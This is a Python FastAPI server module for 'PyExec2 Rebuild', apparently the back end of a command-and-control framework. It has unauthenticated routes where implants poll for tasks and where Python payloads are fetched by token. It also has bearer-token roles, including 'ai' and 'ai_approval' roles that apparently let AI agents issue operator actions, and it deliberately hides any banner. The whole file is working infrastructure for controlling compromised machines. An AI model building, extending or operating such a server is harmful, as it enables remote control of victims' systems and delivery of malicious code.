from __future__ import annotations

from contextlib import asynccontextmanager
import hmac
from typing import Any

from fastapi import Depends, FastAPI, HTTPException, Request
from fastapi.responses import JSONResponse, PlainTextResponse, Response
from pydantic import BaseModel, Field

from .runtime import ServerRuntime


class ActionRequest(BaseModel):
    action: str = Field(min_length=1)
    args: dict[str, Any] = Field(default_factory=dict)


def _extract_token(request: Request) -> str:
    auth = request.headers.get("authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:].strip()
    return request.headers.get("x-pyexec-token", "").strip()


def create_app(runtime: ServerRuntime) -> FastAPI:
    @asynccontextmanager
    async def lifespan(app: FastAPI):
        await runtime.listeners.start_all()
        yield
        await runtime.proxy.stop()
        await runtime.listeners.stop_all()

    app = FastAPI(title="PyExec2 Rebuild", docs_url=None, redoc_url=None, lifespan=lifespan, openapi_url=None)
    app.state.runtime = runtime

    @app.exception_handler(HTTPException)
    async def http_exception_handler(request: Request, exc: HTTPException):
        if exc.status_code == 401:
            return Response(status_code=401, content=b"", headers={"WWW-Authenticate": "Bearer"})
        return JSONResponse({"detail": exc.detail}, status_code=exc.status_code)

    def require_token(request: Request) -> str:
        token = _extract_token(request)
        if token and hmac.compare_digest(token, runtime.settings.token):
            return "human"
        if token and runtime.settings.ai_token and hmac.compare_digest(token, runtime.settings.ai_token):
            return "ai"
        if token and runtime.settings.ai_approval_token and hmac.compare_digest(token, runtime.settings.ai_approval_token):
            return "ai_approval"
        raise HTTPException(status_code=401, detail=None, headers={"WWW-Authenticate": "Bearer"})

    @app.get("/health")
    def health(role: str = Depends(require_token)):
        return {"ok": True, "role": role}

    @app.get("/")
    def root(role: str = Depends(require_token)):
        # Root is intentionally empty. The server is API-only and exposes no
        # public banner or Web UI.
        return Response(status_code=204)

    @app.post("/api/action")
    async def action(payload: ActionRequest, request: Request, role: str = Depends(require_token)):
        origin = request.headers.get("x-pyexec-origin", "web").strip() or "web"
        return await runtime.handle_action(payload.action, payload.args, actor=role, origin=origin)

    @app.get("/api/session")
    def session(role: str = Depends(require_token)):
        return {"ok": True, "role": role, "approval_mode": runtime.approval_mode, "workdir": str(runtime.settings.workdir)}

    @app.post("/api/implant/poll")
    async def implant_poll(request: Request):
        body = await request.json()
        try:
            return runtime.transport_poll(body)
        except Exception:
            return Response(status_code=400, content=b"")

    @app.get("/p/{token}")
    def public_payload(token: str, variant: str = "normal"):
        try:
            record = runtime.payload_by_token(token)
            source = runtime.payload_source(record["id"], variant)
        except Exception:
            return Response(status_code=404)
        return PlainTextResponse(source, media_type="text/x-python", headers={"Cache-Control": "no-store", "X-Content-Type-Options": "nosniff"})

    @app.get("/api/payloads/{payload_id}/download")
    def download_payload(payload_id: str, variant: str = "normal", role: str = Depends(require_token)):
        try:
            source = runtime.payload_source(payload_id, variant)
        except Exception:
            return Response(status_code=404)
        return PlainTextResponse(source, media_type="text/x-python", headers={"Cache-Control": "no-store", "X-Content-Type-Options": "nosniff"})

    return app
